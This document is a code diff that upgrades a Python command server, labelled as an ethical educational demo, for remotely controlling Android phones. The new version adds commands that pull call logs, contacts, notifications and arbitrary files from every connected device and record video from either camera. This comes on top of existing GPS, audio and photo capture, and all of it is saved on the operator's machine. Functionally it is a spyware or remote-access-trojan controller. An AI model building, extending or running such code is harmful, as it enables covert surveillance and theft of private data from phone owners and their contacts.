@@ -1,8 +1,17 @@
 #!/usr/bin/env python3
 """
-Ethical Android Device Demo Server - Enhanced Version 3.0
+Ethical Android Device Demo Server - Version 4.0
 For educational purposes only - demonstrates legitimate client-server communication
 with improved reliability, better logging, and enhanced user experience.
+
+v4.0 New Features:
+- Call logs command (get_call_logs)
+- Contacts command (get_contacts)
+- File browser commands (list_files, get_storage_info, download_file)
+- Video recording command (record_video)
+- Notification reading (get_notifications, live notification forwarding)
+- Enhanced stats and logging
+- Better session management
 """
 
 import socket
@@ -10,21 +19,25 @@ import json
 import threading
 import os
 import time
+import base64
 from datetime import datetime
 import signal
 import sys
+import traceback
 
 # Create directories for received files
 RECEIVED_DIR = "received_files"
 IMAGES_DIR = os.path.join(RECEIVED_DIR, "images")
 AUDIO_DIR = os.path.join(RECEIVED_DIR, "audio")
+VIDEO_DIR = os.path.join(RECEIVED_DIR, "videos")
 DOCS_DIR = os.path.join(RECEIVED_DIR, "docs")
 LOG_FILE = "device_logs.json"
 HISTORY_FILE = "command_history.log"
 STATS_FILE = "server_stats.json"
 
-for d in [RECEIVED_DIR, IMAGES_DIR, AUDIO_DIR, DOCS_DIR]:
+for d in [RECEIVED_DIR, IMAGES_DIR, AUDIO_DIR, VIDEO_DIR, DOCS_DIR]:
     os.makedirs(d, exist_ok=True)
+
 
 class DeviceSession:
     """Represents a connected device session"""
@@ -37,9 +50,14 @@ class DeviceSession:
         self.device_info = {}
         self.total_images_received = 0
         self.total_audio_received = 0
+        self.total_videos_received = 0
+        self.total_files_received = 0
         self.total_commands_processed = 0
+        self.total_notifications_received = 0
         self.bytes_received = 0
         self.bytes_sent = 0
+        self.notifications_buffer = []
+
 
 class DemoServer:
     def __init__(self, host='0.0.0.0', port=8000):
@@ -56,20 +74,20 @@ class DemoServer:
             'active_connections': 0,
             'total_images': 0,
             'total_audio': 0,
+            'total_videos': 0,
+            'total_files': 0,
             'total_commands': 0,
+            'total_notifications': 0,
             'uptime_start': self.start_time
         }
         
-        # Load existing stats if available
         self.load_stats()
 
     def log(self, message):
-        """Log to console with timestamp"""
         ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         print(f"[{ts}] {message}")
 
     def log_to_file(self, data, address):
-        """Log device data to JSON file"""
         try:
             existing = []
             if os.path.exists(LOG_FILE):
@@ -91,49 +109,50 @@ class DemoServer:
             self.log(f"[!] Failed to log to file: {e}")
 
     def log_command(self, command, session_id, result="sent"):
-        """Log commands to history file"""
         ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         with open(HISTORY_FILE, 'a') as f:
-            f.write(f"[{ts}] Session {session_id} | Command: {command} | Result: {result}\\n")
+            f.write(f"[{ts}] Session {session_id} | Command: {command} | Result: {result}\n")
 
     def update_stats(self):
-        """Update server statistics"""
         with self.lock:
             self.stats['active_connections'] = len([s for s in self.sessions.values() if s.connected])
             self.stats['total_connections'] = self.session_counter
             self.stats['total_images'] = sum(s.total_images_received for s in self.sessions.values())
             self.stats['total_audio'] = sum(s.total_audio_received for s in self.sessions.values())
+            self.stats['total_videos'] = sum(s.total_videos_received for s in self.sessions.values())
+            self.stats['total_files'] = sum(s.total_files_received for s in self.sessions.values())
             self.stats['total_commands'] = sum(s.total_commands_processed for s in self.sessions.values())
+            self.stats['total_notifications'] = sum(s.total_notifications_received for s in self.sessions.values())
             self.stats['uptime'] = time.time() - self.start_time
-        
+
     def save_stats(self):
-        """Save statistics to file"""
         try:
+            self.update_stats()
             with open(STATS_FILE, 'w') as f:
                 json.dump(self.stats, f, indent=2)
         except Exception as e:
             self.log(f"[!] Failed to save stats: {e}")
 
     def load_stats(self):
-        """Load statistics from file"""
         try:
             if os.path.exists(STATS_FILE):
                 with open(STATS_FILE, 'r') as f:
                     self.stats = json.load(f)
         except Exception as e:
             self.log(f"[!] Failed to load stats: {e}")
-            # Initialize with defaults if loading fails
             self.stats = {
                 'total_connections': 0,
                 'active_connections': 0,
                 'total_images': 0,
                 'total_audio': 0,
+                'total_videos': 0,
+                'total_files': 0,
                 'total_commands': 0,
+                'total_notifications': 0,
                 'uptime_start': time.time()
             }
 
     def start(self):
-        """Start the server"""
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         try:
@@ -142,30 +161,17 @@ class DemoServer:
             self.running = True
 
             self.log("=" * 60)
-            self.log("  ANDROID DEVICE DEMO SERVER - VERSION 3.0")
+            self.log("  ANDROID DEVICE DEMO SERVER - VERSION 4.0")
             self.log("  Educational Purpose Only")
             self.log("=" * 60)
             self.log(f"[+] Server listening on {self.host}:{self.port}")
             self.log(f"[+] Files saved to: {os.path.abspath(RECEIVED_DIR)}/")
-            self.log(f"[+] Logs saved to: {LOG_FILE}")
-            self.log(f"[+] Command history: {HISTORY_FILE}")
-            self.log(f"[+] Server stats: {STATS_FILE}")
+            self.log(f"[+] Images: {IMAGES_DIR}")
+            self.log(f"[+] Audio:  {AUDIO_DIR}")
+            self.log(f"[+] Video:  {VIDEO_DIR}")
+            self.log(f"[+] Docs:   {DOCS_DIR}")
             self.log("=" * 60)
-            self.log("\\nAvailable commands:")
-            self.log("  1. download_gallery  - Request image from device gallery")
-            self.log("  2. take_photo        - Request camera capture")
-            self.log("  3. get_location      - Request GPS coordinates")
-            self.log("  4. get_file_list     - Request gallery file list")
-            self.log("  5. record_audio      - Request 5s audio recording")
-            self.log("  6. get_app_list      - Request installed apps list")
-            self.log("  7. get_device_info   - Request device information")
-            self.log("  8. list_devices      - Show connected devices")
-            self.log("  9. heartbeat         - Send heartbeat ping")
-            self.log("  10. capture_front    - Request front camera capture")
-            self.log("  11. capture_back     - Request rear camera capture")
-            self.log("  12. stats            - Show server statistics")
-            self.log("  13. help             - Show this help")
-            self.log("  14. quit             - Stop server")
+            self.show_help()
             self.log("=" * 60)
 
             # Start console command thread
@@ -175,6 +181,10 @@ class DemoServer:
             # Start heartbeat monitor thread
             heartbeat_thread = threading.Thread(target=self.heartbeat_monitor, daemon=True)
             heartbeat_thread.start()
+
+            # Start stats save thread
+            stats_thread = threading.Thread(target=self.stats_save_loop, daemon=True)
+            stats_thread.start()
 
             while self.running:
                 try:
@@ -207,6 +217,12 @@ class DemoServer:
                 self.server_socket.close()
             self.save_stats()
 
+    def stats_save_loop(self):
+        """Periodically save stats"""
+        while self.running:
+            time.sleep(30)
+            self.save_stats()
+
     def heartbeat_monitor(self):
         """Monitor device heartbeats and mark stale sessions"""
         while self.running:
@@ -226,7 +242,7 @@ class DemoServer:
         """Server console for sending commands to devices"""
         while self.running:
             try:
-                cmd = input("\\n> ").strip()
+                cmd = input("\n> ").strip()
                 if not cmd:
                     continue
 
@@ -248,19 +264,68 @@ class DemoServer:
                 elif command == "list_devices":
                     self.list_devices()
 
-                elif command == "heartbeat":
-                    self.send_command_to_all("heartbeat")
-
-                elif command == "get_device_info":
-                    self.send_command_to_all("get_device_info")
-
                 elif command == "stats":
                     self.show_stats()
 
+                elif command == "send":
+                    # send <command> [json_args]
+                    if len(parts) < 2:
+                        print("Usage: send <command> [json_args]")
+                        continue
+                    custom_cmd = parts[1]
+                    args_json = ""
+                    if len(parts) > 2:
+                        args_json = " ".join(parts[2:])
+                    self.send_command_to_all(custom_cmd, args_json)
+
+                # === v2.0/v3.0 Commands ===
                 elif command in ["download_gallery", "take_photo", "get_location",
                                  "get_file_list", "record_audio", "get_app_list",
+                                 "get_device_info", "heartbeat",
                                  "capture_front", "capture_back"]:
                     self.send_command_to_all(command)
+
+                # === v4.0 NEW Commands ===
+                elif command == "get_call_logs":
+                    self.send_command_to_all("get_call_logs")
+
+                elif command == "get_contacts":
+                    self.send_command_to_all("get_contacts")
+
+                elif command == "list_files":
+                    # list_files [path]
+                    path = ""
+                    if len(parts) > 1:
+                        path = parts[1]
+                    args = json.dumps({"path": path})
+                    self.send_command_to_all("list_files", args)
+
+                elif command == "get_storage_info":
+                    self.send_command_to_all("get_storage_info")
+
+                elif command == "download_file":
+                    if len(parts) < 2:
+                        print("Usage: download_file <path>")
+                        continue
+                    args = json.dumps({"path": parts[1]})
+                    self.send_command_to_all("download_file", args)
+
+                elif command == "record_video":
+                    # record_video [duration_sec] [front|back]
+                    duration = 10
+                    front = False
+                    if len(parts) > 1:
+                        try:
+                            duration = int(parts[1])
+                        except:
+                            pass
+                    if len(parts) > 2 and parts[2].lower() == "front":
+                        front = True
+                    args = json.dumps({"duration": duration, "front": front})
+                    self.send_command_to_all("record_video", args)
+
+                elif command == "get_notifications":
+                    self.send_command_to_all("get_notifications")
 
                 else:
                     print(f"Unknown command: {command}. Type 'help' for available commands.")
@@ -272,59 +337,73 @@ class DemoServer:
 
     def show_help(self):
         """Show available commands"""
-        print("\\n" + "=" * 50)
-        print("  AVAILABLE COMMANDS")
-        print("=" * 50)
-        print("  1. download_gallery  - Request image from gallery")
-        print("  2. take_photo        - Request camera capture")
-        print("  3. get_location      - Request GPS coordinates")
-        print("  4. get_file_list     - Request gallery file list")
-        print("  5. record_audio      - Request 5s audio recording")
-        print("  6. get_app_list      - Request installed apps list")
-        print("  7. get_device_info   - Request device information")
-        print("  8. list_devices      - Show connected devices")
-        print("  9. heartbeat         - Send heartbeat ping")
-        print("  10. capture_front    - Request front camera capture")
-        print("  11. capture_back     - Request rear camera capture")
-        print("  12. stats            - Show server statistics")
-        print("  13. help             - Show this help")
-        print("  14. quit             - Stop server")
-        print("=" * 50)
+        print("\n" + "=" * 60)
+        print("  ANDROID DEVICE DEMO SERVER v4.0 - AVAILABLE COMMANDS")
+        print("=" * 60)
+        print("\n  --- v2.0/v3.0 Commands ---")
+        print("  1.  download_gallery   - Request image from gallery")
+        print("  2.  take_photo         - Request camera capture (legacy)")
+        print("  3.  get_location       - Request GPS coordinates")
+        print("  4.  get_file_list      - Request gallery file list")
+        print("  5.  record_audio       - Request 5s audio recording")
+        print("  6.  get_app_list       - Request installed apps list")
+        print("  7.  get_device_info    - Request device information")
+        print("  8.  capture_front      - Request front camera capture")
+        print("  9.  capture_back       - Request rear camera capture")
+        print("\n  --- v4.0 NEW Commands ---")
+        print("  10. get_call_logs      - Request device call history")
+        print("  11. get_contacts       - Request contacts list")
+        print("  12. list_files [path]  - Browse files on device")
+        print("  13. get_storage_info   - Get device storage info")
+        print("  14. download_file <p>   - Download a specific file")
+        print("  15. record_video [s] [front|back] - Record video clip")
+        print("  16. get_notifications  - Get recent notifications")
+        print("\n  --- Server Commands ---")
+        print("  17. list_devices       - Show connected devices")
+        print("  18. stats              - Show server statistics")
+        print("  19. send <cmd> [json]  - Send custom command with args")
+        print("  20. help               - Show this help")
+        print("  21. quit               - Stop server")
+        print("=" * 60)
 
     def show_stats(self):
         """Show server statistics"""
         self.update_stats()
-        print("\\n" + "=" * 50)
-        print("  SERVER STATISTICS")
-        print("=" * 50)
-        print(f"  Uptime: {self.stats['uptime']:.0f} seconds ({self.stats['uptime']/3600:.1f} hours)")
-        print(f"  Total Connections: {self.stats['total_connections']}")
-        print(f"  Active Connections: {self.stats['active_connections']}")
-        print(f"  Total Images Received: {self.stats['total_images']}")
-        print(f"  Total Audio Clips Received: {self.stats['total_audio']}")
-        print(f"  Total Commands Processed: {self.stats['total_commands']}")
-        print("=" * 50)
+        print("\n" + "=" * 60)
+        print("  SERVER STATISTICS v4.0")
+        print("=" * 60)
+        uptime = self.stats.get('uptime', 0)
+        print(f"  Uptime: {uptime:.0f}s ({uptime/3600:.1f}h)")
+        print(f"  Total Connections:     {self.stats['total_connections']}")
+        print(f"  Active Connections:    {self.stats['active_connections']}")
+        print(f"  Total Images:          {self.stats['total_images']}")
+        print(f"  Total Audio Clips:     {self.stats['total_audio']}")
+        print(f"  Total Videos:          {self.stats['total_videos']}")
+        print(f"  Total Files Downloaded:{self.stats['total_files']}")
+        print(f"  Total Commands:        {self.stats['total_commands']}")
+        print(f"  Total Notifications:   {self.stats['total_notifications']}")
+        print("=" * 60)
 
     def list_devices(self):
         """List all connected devices"""
         with self.lock:
             if not self.sessions:
-                print("\\n  No devices connected.")
+                print("\n  No devices connected.")
                 return
-            print(f"\\n  Connected Devices ({len(self.sessions)}):")
-            print("  " + "-" * 70)
-            print(f"  {'ID':<4} | {'IP Address':<15} | {'Model':<20} | {'Status':<8} | {'Images':<6} | {'Audio':<5}")
-            print("  " + "-" * 70)
+            print(f"\n  Connected Devices ({len(self.sessions)}):")
+            print("  " + "-" * 90)
+            print(f"  {'ID':<4} | {'IP':<15} | {'Model':<20} | {'Status':<8} | {'Img':<4} | {'Vid':<4} | {'Notif':<6}")
+            print("  " + "-" * 90)
             for sid, session in self.sessions.items():
                 status = "ONLINE" if session.connected else "OFFLINE"
                 ip = session.address[0]
                 model = session.device_info.get('model', 'Unknown')[:20]
-                images = session.total_images_received
-                audio = session.total_audio_received
-                print(f"  {sid:<4} | {ip:<15} | {model:<20} | {status:<8} | {images:<6} | {audio:<5}")
-            print("  " + "-" * 70)
+                print(f"  {sid:<4} | {ip:<15} | {model:<20} | {status:<8} | "
+                      f"{session.total_images_received:<4} | {session.total_videos_received:<4} | "
+                      f"{session.total_notifications_received:<6}")
+            print("  " + "-" * 90)
 
-    def send_command_to_all(self, command):
+    def send_command_to_all(self, command, args_json=""):
         """Send command to all connected devices"""
         with self.lock:
             if not self.sessions:
@@ -333,18 +412,26 @@ class DemoServer:
         sent = 0
         for sid, session in list(self.sessions.items()):
             if session.connected:
-                self.send_command(session, command)
+                self.send_command(session, command, args_json)
                 self.log_command(command, sid)
                 sent += 1
         self.log(f"[+] Command '{command}' sent to {sent} device(s)")
 
-    def send_command(self, session, command):
+    def send_command(self, session, command, args_json=""):
         """Send a command to a specific device session"""
         try:
-            msg = json.dumps({"type": "command", "command": command}).encode('utf-8')
+            msg_dict = {"type": "command", "command": command}
+            if args_json:
+                try:
+                    args = json.loads(args_json)
+                    msg_dict.update(args)
+                except:
+                    pass
+            msg = json.dumps(msg_dict).encode('utf-8')
             session.client_socket.send(msg)
             with self.lock:
                 session.bytes_sent += len(msg)
+                session.total_commands_processed += 1
         except Exception as e:
             self.log(f"[!] Failed to send command to session {session.session_id}: {e}")
             session.connected = False
@@ -358,6 +445,9 @@ class DemoServer:
                     data = session.client_socket.recv(65536)
                     if not data:
                         break
+
+                    with self.lock:
+                        session.bytes_received += len(data)
 
                     combined = remainder + data
                     remainder = b""
@@ -377,8 +467,16 @@ class DemoServer:
 
                             if len(pending["data"]) >= total_needed:
                                 # File complete!
-                                file_type = pending["type"]
-                                save_dir = IMAGES_DIR if file_type == "image" else (AUDIO_DIR if file_type == "audio" else DOCS_DIR)
+                                file_type = pending.get("file_type", "image")
+                                if file_type == "image":
+                                    save_dir = IMAGES_DIR
+                                elif file_type == "audio":
+                                    save_dir = AUDIO_DIR
+                                elif file_type == "video":
+                                    save_dir = VIDEO_DIR
+                                else:
+                                    save_dir = DOCS_DIR
+                                
                                 filename = pending["filename"]
                                 filepath = os.path.join(save_dir, filename)
 
@@ -391,6 +489,10 @@ class DemoServer:
                                         session.total_images_received += 1
                                     elif file_type == "audio":
                                         session.total_audio_received += 1
+                                    elif file_type == "video":
+                                        session.total_videos_received += 1
+                                    else:
+                                        session.total_files_received += 1
 
                                 # Send acknowledgment
                                 ack = json.dumps({
@@ -404,16 +506,14 @@ class DemoServer:
                             # We are expecting JSON
                             try:
                                 chunk_str = combined[idx:].decode('utf-8')
-                                import json
                                 decoder = json.JSONDecoder()
                                 message, end_pos = decoder.raw_decode(chunk_str)
 
                                 # Process JSON message
                                 self.handle_json_message(session, message)
 
-                                # Move idx forward by the number of bytes the JSON took
-                                # This handles UTF-8 characters correctly
-                                json_bytes_len = chunk_str[:end_pos].encode('utf-8').__len__()
+                                # Move idx forward
+                                json_bytes_len = len(chunk_str[:end_pos].encode('utf-8'))
                                 idx += json_bytes_len
                             except (json.JSONDecodeError, UnicodeDecodeError):
                                 # Incomplete JSON - wait for more data
@@ -423,7 +523,6 @@ class DemoServer:
                     break
                 except Exception as e:
                     self.log(f"[!] Session {session.session_id} error: {e}")
-                    import traceback
                     traceback.print_exc()
                     break
 
@@ -448,12 +547,15 @@ class DemoServer:
         elif msg_type == "device_info":
             session.device_info = message.get("device_info", {})
             session.last_heartbeat = time.time()
-            self.log(f"[i] Device info from session {session.session_id}:")
             info = session.device_info
+            self.log(f"[i] Device info from session {session.session_id}:")
             self.log(f"    Model: {info.get('model', 'Unknown')}")
             self.log(f"    Android: {info.get('android_version', 'Unknown')}")
+            self.log(f"    App Version: {info.get('app_version', 'Unknown')}")
             self.log(f"    Emulator: {info.get('is_emulator', 'Unknown')}")
             self.log(f"    Device ID: {info.get('device_id', 'Unknown')}")
+            perms = message.get("permissions", [])
+            self.log(f"    Permissions granted: {len(perms)}")
             self.log_to_file(message, session.address)
 
         elif msg_type == "location":
@@ -468,7 +570,7 @@ class DemoServer:
 
         elif msg_type == "file_list":
             files = message.get("files", [])
-            self.log(f"[i] Gallery file list from session {session.session_id}:")
+            self.log(f"[i] Gallery file list from session {session.session_id} ({len(files)} files):")
             for f in files[:20]:
                 self.log(f"    - {f}")
             if len(files) > 20:
@@ -485,7 +587,6 @@ class DemoServer:
             self.log_to_file(message, session.address)
 
         elif msg_type == "file_transfer_start":
-            # Device is about to send a file
             filename = message.get("filename", "unknown")
             file_size = message.get("size", 0)
             file_type = message.get("file_type", "image")
@@ -500,7 +601,6 @@ class DemoServer:
             self.log(f"    Size: {file_size} bytes")
             self.log(f"    Type: {file_type}")
 
-            # Send acknowledgment
             ack = json.dumps({"type": "ack", "message": "ready_to_receive"}).encode('utf-8')
             session.client_socket.send(ack)
             with self.lock:
@@ -513,19 +613,20 @@ class DemoServer:
         elif msg_type == "command_response":
             cmd = message.get("command", "unknown")
             status = message.get("status", "unknown")
+            payload = message.get("payload", {})
             self.log(f"[i] Command response from session {session.session_id}:")
             self.log(f"    Command: {cmd}")
             self.log(f"    Status: {status}")
+            if payload:
+                self.log(f"    Payload: {json.dumps(payload)}")
             self.log_command(cmd, session.session_id, f"response: {status}")
             self.log_to_file(message, session.address)
 
         elif msg_type == "audio_data":
-            # Audio data sent as base64 in JSON
-            import base64
             audio_b64 = message.get("data", "")
             if audio_b64:
                 audio_bytes = base64.b64decode(audio_b64)
-                filename = f"audio_{int(time.time())}.wav"
+                filename = f"audio_{int(time.time())}.3gp"
                 filepath = os.path.join(AUDIO_DIR, filename)
                 with open(filepath, 'wb') as f:
                     f.write(audio_bytes)
@@ -534,79 +635,97 @@ class DemoServer:
                     session.total_audio_received += 1
             self.log_to_file(message, session.address)
 
-        elif msg_type == "capture_response":
-            # Handle camera capture responses from client
-            timestamp = message.get("timestamp", 0)
-            capture_status = message.get("capture_status", "unknown")
-            upload_status = message.get("upload_status", "unknown")
-            filename = message.get("filename", "unknown")
-            file_size = message.get("file_size", 0)
-            
-            self.log(f"[i] Capture response from session {session.session_id}:")
-            self.log(f"    Timestamp: {timestamp}")
-            self.log(f"    Capture Status: {capture_status}")
-            self.log(f"    Upload Status: {upload_status}")
-            self.log(f"    Filename: {filename}")
-            self.log(f"    File Size: {file_size} bytes")
-            
-            if upload_status == "queued":
-                self.log(f"    (Image queued for upload)")
-            elif upload_status == "success":
-                self.log(f"    (Image successfully uploaded)")
-                with self.lock:
-                    session.total_images_received += 1
+        # === v4.0 NEW MESSAGE HANDLERS ===
+
+        elif msg_type == "call_logs":
+            calls = message.get("calls", [])
+            count = message.get("count", 0)
+            self.log(f"[i] Call logs from session {session.session_id} ({count} calls):")
+            for call in calls[:20]:
+                call_type = call.get("type", 0)
+                type_str = {1: "INCOMING", 2: "OUTGOING", 3: "MISSED", 4: "VOICEMAIL", 5: "REJECTED", 6: "BLOCKED"}.get(call_type, "UNKNOWN")
+                self.log(f"    [{type_str}] {call.get('name', 'Unknown')} - {call.get('number', '?')} ({call.get('duration_sec', 0)}s)")
+            if count > 20:
+                self.log(f"    ... and {count - 20} more")
+            self.log_to_file(message, session.address)
+
+        elif msg_type == "contacts":
+            contacts = message.get("contacts", [])
+            count = message.get("count", 0)
+            self.log(f"[i] Contacts from session {session.session_id} ({count} contacts):")
+            for contact in contacts[:20]:
+                name = contact.get("name", "Unknown")
+                phones = contact.get("phones", [])
+                phone_str = ", ".join(p.get("number", "") for p in phones)
+                self.log(f"    - {name}: {phone_str}")
+            if count > 20:
+                self.log(f"    ... and {count - 20} more")
+            self.log_to_file(message, session.address)
+
+        elif msg_type == "file_list":
+            # File browser results (different from gallery file_list)
+            files = message.get("files", [])
+            path = message.get("path", "")
+            count = message.get("count", 0)
+            self.log(f"[i] File browser from session {session.session_id} - Path: {path} ({count} items):")
+            for f in files[:20]:
+                name = f.get("name", "?")
+                is_dir = f.get("is_directory", False)
+                size = f.get("size", 0)
+                marker = "📁" if is_dir else "📄"
+                self.log(f"    {marker} {name}" + (f" ({size} bytes)" if not is_dir else ""))
+            if count > 20:
+                self.log(f"    ... and {count - 20} more")
+            self.log_to_file(message, session.address)
+
+        elif msg_type == "storage_info":
+            self.log(f"[i] Storage info from session {session.session_id}:")
+            self.log(f"    Total: {message.get('total_gb', '?')} GB")
+            self.log(f"    Free:  {message.get('free_gb', '?')} GB")
+            self.log(f"    Used:  {message.get('used_percent', '?')}%")
+            self.log_to_file(message, session.address)
+
+        elif msg_type == "notification":
+            notif = message.get("notification", {})
+            package = notif.get("package", "Unknown")
+            title = notif.get("title", "")
+            text = notif.get("text", "")
+            self.log(f"[📬] Notification from {package}:")
+            self.log(f"     Title: {title}")
+            self.log(f"     Text: {text}")
+            with self.lock:
+                session.total_notifications_received += 1
+                session.notifications_buffer.append(notif)
+            self.log_to_file(message, session.address)
+
+        elif msg_type == "active_notifications":
+            notifications = message.get("notifications", [])
+            count = message.get("count", 0)
+            self.log(f"[i] Active notifications from session {session.session_id} ({count} notifications):")
+            for n in notifications[:20]:
+                self.log(f"    [{n.get('package', '?')}] {n.get('title', '')}: {n.get('text', '')}")
+            if count > 20:
+                self.log(f"    ... and {count - 20} more")
             self.log_to_file(message, session.address)
 
         else:
             self.log(f"[i] Message from session {session.session_id}: {msg_type}")
             self.log_to_file(message, session.address)
 
-    def handle_file_data(self, session, data):
-        """Handle binary file data"""
-        pending = session.device_info.get("pending_file")
-        if pending:
-            pending["data"] += data
 
-            # Check if we have all the data
-            if len(pending["data"]) >= pending["size"]:
-                # Save the file
-                file_type = pending["type"]
-                if file_type == "image":
-                    save_dir = IMAGES_DIR
-                elif file_type == "audio":
-                    save_dir = AUDIO_DIR
-                else:
-                    save_dir = DOCS_DIR
-
-                filename = pending["filename"]
-                filepath = os.path.join(save_dir, filename)
-                with open(filepath, 'wb') as f:
-                    f.write(pending["data"])
-
-                self.log(f"[+] File saved: {filepath} ({len(pending['data'])} bytes)")
-                with self.lock:
-                    if file_type == "image":
-                        session.total_images_received += 1
-                    elif file_type == "audio":
-                        session.total_audio_received += 1
-
-                # Send acknowledgment
-                ack = json.dumps({
-                    "type": "ack",
-                    "message": "file_received",
-                    "filename": filename
-                }).encode('utf-8')
-                session.client_socket.send(ack)
-                with self.lock:
-                    session.bytes_sent += len(ack)
-
-                # Clear pending file
-                session.device_info.pop("pending_file", None)
-
-        else:
-            self.log(f"[*] Unexpected binary data from session {session.session_id} ({len(data)} bytes)")
+def signal_handler(sig, frame):
+    print("\n[!] Ctrl+C received. Shutting down...")
+    if 'server' in globals():
+        server.running = False
+        server.save_stats()
+        try:
+            server.server_socket.close()
+        except:
+            pass
+    sys.exit(0)
 
 
 if __name__ == "__main__":
+    signal.signal(signal.SIGINT, signal_handler)
     server = DemoServer(host='0.0.0.0', port=8000)
     server.start()
